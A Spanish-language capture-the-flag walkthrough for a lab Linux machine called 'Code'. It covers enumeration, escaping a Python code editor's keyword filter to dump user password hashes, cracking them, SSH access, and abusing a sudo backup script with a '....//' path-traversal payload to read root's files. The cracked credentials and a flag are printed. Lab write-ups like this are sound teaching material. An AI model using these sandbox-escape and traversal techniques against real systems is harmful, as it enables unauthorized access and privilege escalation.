***
- Tags: 
****
Vamos a resolver la máquina Code
- Categoría: Fácil
- Sistema: Linux
- IP: `10.10.11.62`

### 1. Enumeración

Tras un escaneo inicial de puertos, encontramos la siguiente información:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que está abierto SSH, lo cual será interesante para más adelante. Enfocandonos en el puerto 5000, vemos que es una página web en la que hay desplegado un intérprete de Python. Investigando el código fuente en busca de comentarios o algo parecido, no encontramos nada interesante. A partir de aquí, pasamos a la enumeración de directorios. Para ello, usamos `wfuzz`:

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --hl 5,99 http://10.10.11.62:5000/FUZZ
```

Tras un rato esperando, encontramos las siguientes rutas:
- `login`
- `logout`
- `register`
- `about`
- `codes` -> Redirige a login
### 2. Foothold

Dado que directamente tenemos un terminal funcional en Python, probemos a ver si podemos mostrar el `/etc/passwd` con `print(open('/etc/passwd').read())`. No parece funcionar, nos dice *Use of restricted keywords is not allowed.* Por tanto, vamos a mostrar información de usuarios:

```python
table = User.__table__
print([col.name for col in table.columns])
```

Esto nos da la siguiente información: `['id', 'username', 'password']`. A partir de aquí, enumeramos usuarios existentes con las limitaciones que tenemos respecto al uso de restricted keywords.

```python
print([(user.id, user.username, user.password) for user in User.query.all()])
```

Nos da la siguiente información: `(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]`
Es decir, hay 2 usuarios existentes, con sus contraseñas hasheadas. Las guardamos en algún txt y vemos qué tipo de hash tienen, por ejemplo con CrackStation. Son del tipo MD5, y la web nos lo crackea directamente, pero podríamos usar Hashcat con el módulo 0 o John the Ripper. 

```
development:development
martin:nafeelswordsmaster
```

Intentando conexión por SSH, conseguimos entrar como el usuario martin, pero no como el usuario development. De vuelta a la web, si que nos deja entrar como el usuario `development`, pero no tiene códigos guardados interesantes, tan solo uno como `Test` que solo imprime una cadena de texto. El usuario `martin` tampoco tiene códigos guardados, por lo que nos toca tirar por SSH. Una vez entramos como el usuario martin, buscamos dentro de `/home` si está la flag, pero no hay suerte. Existen dos carpetas: `/martin` y `/app-production`. Dentro de la carpeta del usuario, existe una carpeta llamada `/backups`, y dentro de la misma, un archivo .json:

```bash
martin@code:~/backups$ cat task.json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

La carpeta `/home/app-production/app` parece interesante. Pero no tenemos permisos para listarla o navegar ahí. En este punto, podemos comprobar lo de siempre: crontabs, procesos, archivos SUID...

##### Archivos SUID

```bash
find / -type f -perm -4000 2>/dev/null
```

No encontramos nada

##### Listado con sudo

```bash
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Vemos que el script en cuestión se puede ejecutar como sudo para este usuario. Este script tiene la siguiente función:

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done
```

En resumen, lo más interesante que hace es que usa el archivo `task.json` visto previamente para hacer un backup. Dado que podemos modificar el archivo en cuestión, hacemos que nos lea la flag del usuario. Modificamos el archivo y ponemos esto

```json
...
	"directories_to_archive": [
		"/home/app-production/user.txt"
	],
...
```

Se generará un archivo `.bz2` que debemos descomprimir de esta forma:

```bash
tar -xjf ./code_home_app-production_user.txt_2025_May.tar.bz2
```

Finalmente obtenemos la flag, encontrada al descomprimir el archivo y navegar hasta ella.

### 3. Escalada de privilegios

Conseguimos la flag de root de la misma forma que antes, pero esta vez, creando un nuevo `task.json`. En él incluimos el siguiente código:

```JSON
{  
	"destination": "/home/martin/",  
	"multiprocessing": true,  
	"verbose_log": true,  
	"directories_to_archive": [  
		"/home/....//root/"  
	]  
}
```

Ahora simplemente vamos hacia atrás y descomprimimos el archivo que se ha generado, de la misma forma.

```bash
martin@code:~$ tar -xjf code_home_.._root_2025_May.tar.bz2 
martin@code:~$ ls
backups  code_home_.._root_2025_May.tar.bz2  root
martin@code:~$ cd root/
martin@code:~/root$ ls
root.txt  scripts
martin@code:~/root$ cat root.txt 
af143ab973c5c6a5d66ab197a8ac2ea1
```